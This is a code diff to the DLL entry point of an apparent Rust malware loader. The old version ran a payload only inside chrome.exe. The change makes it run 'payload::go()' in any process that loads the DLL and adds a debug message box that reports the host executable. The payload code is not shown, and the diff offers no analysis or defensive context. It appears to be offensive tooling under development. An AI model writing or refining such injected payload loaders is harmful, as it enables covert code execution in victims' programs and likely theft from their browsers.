@@ -9,17 +9,18 @@ pub const TRUE: BOOL = 1;
 extern "system" fn dll_main(_: usize, dw_reason: u32, _: usize) -> BOOL {
     match dw_reason {
         DLL_PROCESS_ATTACH => {
-            // Check executable
-            if let Ok(exe_path) = std::env::current_exe() {
-                if let Some(file_name) = exe_path.file_name() {
-                    if let Some(name_str) = file_name.to_str() {
-                        if name_str.eq_ignore_ascii_case("chrome.exe") {
-                            // Execute payload
-                            payload::go();
-                        }
-                    }
+            #[cfg(feature = "debug")] {
+                use windows::{core::{w, PCWSTR}, Win32::UI::WindowsAndMessaging::{MessageBoxW, MB_OK}};
+
+                if let Ok(path) = std::env::current_exe() {
+                    let wide_path: Vec<u16> = path.to_string_lossy().to_string().encode_utf16().chain(Some(0)).collect();
+
+                    unsafe { MessageBoxW(None, PCWSTR(wide_path.as_ptr()), w!("Loaded In:") , MB_OK,); }
                 }
             }
+
+            // Execute payload
+            payload::go();
         }
         DLL_PROCESS_DETACH => {}
         _ => {}
